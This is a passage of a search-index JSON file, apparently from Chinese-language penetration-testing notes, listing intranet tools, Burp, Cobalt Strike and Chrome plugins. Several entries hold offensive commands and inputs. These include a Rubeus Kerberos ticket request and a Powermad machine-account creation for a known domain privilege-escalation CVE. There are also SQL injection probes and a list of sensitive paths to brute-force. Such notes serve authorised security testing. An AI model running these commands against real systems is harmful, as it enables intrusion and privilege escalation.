%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#_8","text":"get-domaintrust -domain name","title":"\u67e5\u770b\u57df\u4fe1\u4efb"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#acl","text":"Get-ObjectAcl -samAccountName username -ResolveGUIDs","title":"\u67e5\u770bacl"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#rubeus","text":"\u6ee5\u7528Kerberos\u7684\u5de5\u5177","title":"Rubeus"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#tgt","text":"impacket\u4e5f\u53ef\u4ee5\u505a\u5230 Rubeus.exe asktgt /user:DC /password:******* /domain:attack.local /dc:attack.local /nowrap","title":"\u83b7\u53d6tgt"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#_9","text":"","title":"\u6742"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#powermad","text":"\u7528\u4e8e\u4e0e\u673a\u5668\u8d26\u6237\u4ea4\u6d89\u3002\u5982CVE-2021-42287\\&CVE-2021-42278 \u57df\u5185\u63d0\u6743\uff0c\u53ef\u7528\u5b83\u6765\u521b\u5efa\u673a\u5668\u7528\u6237 Import-Module .\\Powermad.ps1;New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString \"hack\" -AsPlainText -Force)","title":"Powermad"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#sharprdp","text":"\u4f7f\u7528rdp\u534f\u8bae\u8fdb\u884c\u6a2a\u5411\uff0c\u53ef\u4ee5\u7ed5\u8fc7smb\u4e0d\u53ef\u7528\u7b49\u60c5\u51b5 https://github.com/0xthirteen/SharpRDP","title":"SharpRDP"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/","text":"\u72ec\u7acb\u5de5\u5177 \u76ee\u5f55","title":"\u72ec\u7acb\u5de5\u5177"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/#_1","text":"","title":"\u72ec\u7acb\u5de5\u5177"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/#_2","text":"","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/%E7%8B%AC%E7%AB%8B%E5%B7%A5%E5%85%B7/#_3","text":"","title":""},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/","text":"\u5404\u5de5\u5177\u63d2\u4ef6 CS\u63d2\u4ef6 Burp\u63d2\u4ef6 chrome\u63d2\u4ef6","title":"\u5404\u5de5\u5177\u63d2\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/#_1","text":"CS\u63d2\u4ef6 Burp\u63d2\u4ef6 chrome\u63d2\u4ef6","title":"\u5404\u5de5\u5177\u63d2\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/","text":"Burp\u63d2\u4ef6 \u76ee\u5f55 \u76ee\u5f55\u626b\u63cf APIKit onescan \u654f\u611f\u4fe1\u606f HaE \u6f0f\u626b xiaSQL BurpFastJsonScan SpringScan Log4j2Scan BurpShiroPassiveScan reflector xiayue 403bypasser \u76ee\u5f55\u626b\u63cf APIKit \u627eswagger\u8fd9\u79cdapi\u63a5\u53e3\u7684 onescan \u9012\u5f52\u7206\u7834\u76ee\u5f55 https://github.com/vaycore/OneScan \u76ee\u6807\u7ad9\u70b9\u8bbf\u95ee\uff1a http://www.xxxxxx.com/a/b/c/xxx.min.js \uff0c\u63d2\u4ef6\u4f1a\u81ea\u52a8\u626b\u63cf\u5982\u4e0b\u7684\u8def\u5f84\uff1a http://www.xxxxxx.com/api-docs http://www.xxxxxx.com/xxxxxx.zip http://www.xxxxxx.com/a/api-docs http://www.xxxxxx.com/a/xxxxxx.zip http://www.xxxxxx.com/a/b/api-docs http://www.xxxxxx.com/a/b/xxxxxx.zip http://www.xxxxxx.com/a/b/c/api-docs http://www.xxxxxx.com/a/b/c/xxxxxx.zip /v2/api-docs /api/v1 /api/v2 /api/v1/ /api/v2/ /{{domain}}.zip /{{domain.main}}.zip /{{domain.name}}.zip /env /actuator /jolokia/list /swagger-resources /v1/swagger.json /v2/swagger.json /druid/index.html /druid/basic.json /.git \u654f\u611f\u4fe1\u606f HaE \u5728\u62a5\u6587\u91cc\u9ad8\u4eae\u654f\u611f\u4fe1\u606f\u3002 \u5fc5\u88c5 \u6f0f\u626b xiaSQL \u7b80\u5355\u7684SQl\u6ce8\u5165\u626b\u63cf\uff0c\u539f\u7406\u5f88\u7b80\u5355\u5c31\u662f\u5728\u8bf7\u6c42\u6700\u540e\u52a0\u4e2a\u5355\u5f15\u53f7\u67e5\u770b\u54cd\u5e94\u7684\u53d8\u5316 '%20or%201='1 '%20and%20sleep(5)# BurpFastJsonScan \u008f https://github.com/pmiaowu/BurpFastJsonScan \u68c0\u6d4b\u65b9\u5f0f\uff1a\u547d\u4ee4\u56de\u663e/dnslog \u7528burp\u81ea\u5e26\u7684collabrator\u5c31\u53ef\u4ee5\u4e86 SpringScan Spring Core RCE ( CVE-2022-22965 ) Spring Cloud Function SpEL RCE ( CVE-2022-22963 ) Spring Cloud GateWay SPEL RCE ( CVE-2022-22947 ) https://github.com/metaStor/SpringScan \u9700dnslog \u9009\u88c5\uff0c\u611f\u89c9\u5b9e\u6218\u7528\u5904\u4e0d\u592a\u5927\uff0c\u4e0d\u5bb9\u6613\u626b\u5230 Log4j2Scan https://github.com/whwlsfb/Log4j2Scan \u88ab\u52a8\u626b\u63cflog4j\u6f0f\u6d1e,\u9700dnslog \u9009\u88c5\uff0c\u5b9e\u6218\u4e0d\u5bb9\u6613\u626b\u5230 BurpShiroPassiveScan shiro\u626b\u63cf https://github.com/pmiaowu/BurpShiroPassiveScan \u63a2\u6d4bshiro+\u63a2\u6d4bkey\uff08\u4e0d\u7528dnslog\u7b49\u5916\u8fde\u7f51\u7ad9\uff09 \u9009\u88c5\uff0c\u5b9e\u6218\u4e0d\u5bb9\u6613\u626b\u5230\uff0c\u800c\u4e14onescan\u91cc\u4e5f\u6709shiro\u7684\u6307\u7eb9\u8bc6\u522b reflector https://github.com/elkokc/reflector xss\u68c0\u6d4b xiayue https://github.com/smxiazi/xia_Yue \u6d4b\u8d8a\u6743\uff0c\u548cxiayue\u4e00\u4e2a\u4f5c\u8005\uff0c\u8fd9\u4e2a\u4f5c\u8005\u592a\u725b\u6279\u4e86\uff0c\u7b80\u5355\u7c97\u66b4 403bypasser https://github.com/sting8k/BurpSuite_403Bypasser \u7ed5\u8fc7403\u5bfb\u627e\u60ca\u559c \u9700jython\u652f\u6301","title":"Burp\u63d2\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#burp","text":"","title":"Burp\u63d2\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#_1","text":"\u76ee\u5f55\u626b\u63cf APIKit onescan \u654f\u611f\u4fe1\u606f HaE \u6f0f\u626b xiaSQL BurpFastJsonScan SpringScan Log4j2Scan BurpShiroPassiveScan reflector xiayue 403bypasser","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#_2","text":"","title":"\u76ee\u5f55\u626b\u63cf"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#apikit","text":"\u627eswagger\u8fd9\u79cdapi\u63a5\u53e3\u7684","title":"APIKit"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#onescan","text":"\u9012\u5f52\u7206\u7834\u76ee\u5f55 https://github.com/vaycore/OneScan \u76ee\u6807\u7ad9\u70b9\u8bbf\u95ee\uff1a http://www.xxxxxx.com/a/b/c/xxx.min.js \uff0c\u63d2\u4ef6\u4f1a\u81ea\u52a8\u626b\u63cf\u5982\u4e0b\u7684\u8def\u5f84\uff1a http://www.xxxxxx.com/api-docs http://www.xxxxxx.com/xxxxxx.zip http://www.xxxxxx.com/a/api-docs http://www.xxxxxx.com/a/xxxxxx.zip http://www.xxxxxx.com/a/b/api-docs http://www.xxxxxx.com/a/b/xxxxxx.zip http://www.xxxxxx.com/a/b/c/api-docs http://www.xxxxxx.com/a/b/c/xxxxxx.zip /v2/api-docs /api/v1 /api/v2 /api/v1/ /api/v2/ /{{domain}}.zip /{{domain.main}}.zip /{{domain.name}}.zip /env /actuator /jolokia/list /swagger-resources /v1/swagger.json /v2/swagger.json /druid/index.html /druid/basic.json /.git","title":"onescan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#_3","text":"","title":"\u654f\u611f\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#hae","text":"\u5728\u62a5\u6587\u91cc\u9ad8\u4eae\u654f\u611f\u4fe1\u606f\u3002 \u5fc5\u88c5","title":"HaE"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#_4","text":"","title":"\u6f0f\u626b"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#xiasql","text":"\u7b80\u5355\u7684SQl\u6ce8\u5165\u626b\u63cf\uff0c\u539f\u7406\u5f88\u7b80\u5355\u5c31\u662f\u5728\u8bf7\u6c42\u6700\u540e\u52a0\u4e2a\u5355\u5f15\u53f7\u67e5\u770b\u54cd\u5e94\u7684\u53d8\u5316 '%20or%201='1 '%20and%20sleep(5)#","title":"xiaSQL"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#burpfastjsonscan","text":"\u008f https://github.com/pmiaowu/BurpFastJsonScan \u68c0\u6d4b\u65b9\u5f0f\uff1a\u547d\u4ee4\u56de\u663e/dnslog \u7528burp\u81ea\u5e26\u7684collabrator\u5c31\u53ef\u4ee5\u4e86","title":"BurpFastJsonScan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#springscan","text":"Spring Core RCE ( CVE-2022-22965 ) Spring Cloud Function SpEL RCE ( CVE-2022-22963 ) Spring Cloud GateWay SPEL RCE ( CVE-2022-22947 ) https://github.com/metaStor/SpringScan \u9700dnslog \u9009\u88c5\uff0c\u611f\u89c9\u5b9e\u6218\u7528\u5904\u4e0d\u592a\u5927\uff0c\u4e0d\u5bb9\u6613\u626b\u5230","title":"SpringScan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#log4j2scan","text":"https://github.com/whwlsfb/Log4j2Scan \u88ab\u52a8\u626b\u63cflog4j\u6f0f\u6d1e,\u9700dnslog \u9009\u88c5\uff0c\u5b9e\u6218\u4e0d\u5bb9\u6613\u626b\u5230","title":"Log4j2Scan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#burpshiropassivescan","text":"shiro\u626b\u63cf https://github.com/pmiaowu/BurpShiroPassiveScan \u63a2\u6d4bshiro+\u63a2\u6d4bkey\uff08\u4e0d\u7528dnslog\u7b49\u5916\u8fde\u7f51\u7ad9\uff09 \u9009\u88c5\uff0c\u5b9e\u6218\u4e0d\u5bb9\u6613\u626b\u5230\uff0c\u800c\u4e14onescan\u91cc\u4e5f\u6709shiro\u7684\u6307\u7eb9\u8bc6\u522b","title":"BurpShiroPassiveScan"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#reflector","text":"https://github.com/elkokc/reflector xss\u68c0\u6d4b","title":"reflector"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#xiayue","text":"https://github.com/smxiazi/xia_Yue \u6d4b\u8d8a\u6743\uff0c\u548cxiayue\u4e00\u4e2a\u4f5c\u8005\uff0c\u8fd9\u4e2a\u4f5c\u8005\u592a\u725b\u6279\u4e86\uff0c\u7b80\u5355\u7c97\u66b4","title":"xiayue"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/Burp%E6%8F%92%E4%BB%B6/#403bypasser","text":"https://github.com/sting8k/BurpSuite_403Bypasser \u7ed5\u8fc7403\u5bfb\u627e\u60ca\u559c \u9700jython\u652f\u6301","title":"403bypasser"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/CS%E6%8F%92%E4%BB%B6/CS%E6%8F%92%E4%BB%B6/","text":"CS\u63d2\u4ef6 taowu \u7efc\u5408\u63d2\u4ef6 https://github.com/pandasec888/taowu-cobalt-strike","title":"CS\u63d2\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/CS%E6%8F%92%E4%BB%B6/CS%E6%8F%92%E4%BB%B6/#cs","text":"","title":"CS\u63d2\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/CS%E6%8F%92%E4%BB%B6/CS%E6%8F%92%E4%BB%B6/#taowu","text":"\u7efc\u5408\u63d2\u4ef6 https://github.com/pandasec888/taowu-cobalt-strike","title":"taowu"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/","text":"chrome\u63d2\u4ef6 \u76ee\u5f55 ICP Query Extension Proxy SwitchyOmega Wappalyzer User-Agent Switcher for Chrome d3coder WebSite IP Information Query Heimdallr ICP Query Extension \u901a\u8fc7icp\u770b\u7f51\u7ad9\u5f52\u5c5e\u4e8e\u54ea\u4e2a\u7ec4\u7ec7 Proxy SwitchyOmega \u5207\u6362\u4ee3\u7406 Wappalyzer \u7b80\u5355\u7684\u6307\u7eb9\u8bc6\u522b User-Agent Switcher for Chrome \u5207\u6362ua d3coder \u9009\u4e2d\uff0c\u53f3\u952e\u89e3\u7801 WebSite IP Information Query \u67e5\u8be2\u5f53\u524d\u7f51\u7ad9IP\u5f52\u5c5e Heimdallr \u63d0\u793a\u6f0f\u6d1e\u6846\u67b6\u6307\u7eb9 \u3001 \u544a\u8b66\u62e6\u622a\u871c\u7f50\u8bf7\u6c42 \u3001 \u5bf9\u6297\u6d4f\u89c8\u5668\u7279\u5f81\u8ffd\u8e2a https://github.com/Ghr07h/Heimdallr","title":"chrome\u63d2\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/#chrome","text":"","title":"chrome\u63d2\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/#_1","text":"ICP Query Extension Proxy SwitchyOmega Wappalyzer User-Agent Switcher for Chrome d3coder WebSite IP Information Query Heimdallr","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/#icp-query-extension","text":"\u901a\u8fc7icp\u770b\u7f51\u7ad9\u5f52\u5c5e\u4e8e\u54ea\u4e2a\u7ec4\u7ec7","title":"ICP Query Extension"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/#proxy-switchyomega","text":"\u5207\u6362\u4ee3\u7406","title":"Proxy SwitchyOmega"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/#wappalyzer","text":"\u7b80\u5355\u7684\u6307\u7eb9\u8bc6\u522b","title":"Wappalyzer"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/#user-agent-switcher-for-chrome","text":"\u5207\u6362ua","title":"User-Agent Switcher for Chrome"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/#d3coder","text":"\u9009\u4e2d\uff0c\u53f3\u952e\u89e3\u7801","title":"d3coder"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/#website-ip-information-query","text":"\u67e5\u8be2\u5f53\u524d\u7f51\u7ad9IP\u5f52\u5c5e","title":"WebSite IP Information Query"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%90%84%E5%B7%A5%E5%85%B7%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/chrome%E6%8F%92%E4%BB%B6/#heimdallr","text":"\u63d0\u793a\u6f0f\u6d1e\u6846\u67b6\u6307\u7eb9 \u3001 \u544a\u8b66\u62e6\u622a\u871c\u7f50\u8bf7\u6c42 \u3001 \u5bf9\u6297\u6d4f\u89c8\u5668\u7279\u5f81\u8ffd\u8e2a https://github.com/Ghr07h/Heimdallr","title":"Heimdallr"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85/","text":"\u6293\u5305 \u76ee\u5f55 Burp yakit Whistle Burp \u4e0d\u89e3\u91ca yakit \u63d2\u4ef6\u4e30\u5bcc\uff0c\u754c\u9762\u53cb\u597d\u7684\u7f1d\u5408\u602a Whistle web\u7aef\u6293\u5305 \u7b2c\u4e00\u6b21\u7528\u662f\u62ff\u6765\u914d\u5408clash\u6293\u5fae\u4fe1\u6d41\u91cf\u7684\uff0c\u56e0\u4e3aclash+burp\u5728macos\u4f1a\u56e0\u4e3a\u8bc1\u4e66\u95ee\u9898\u6253\u4e0d\u5f00\u7f51\u7ad9\u3002 \u53ea\u80fd\u5f53\u66ff\u4ee3\u54c1","title":"\u6293\u5305"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85/#_1","text":"","title":"\u6293\u5305"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E6%8A%93%E5%8C%85/%E6%8A%93%E5%8C%85/#_2","text":"Burp yakit 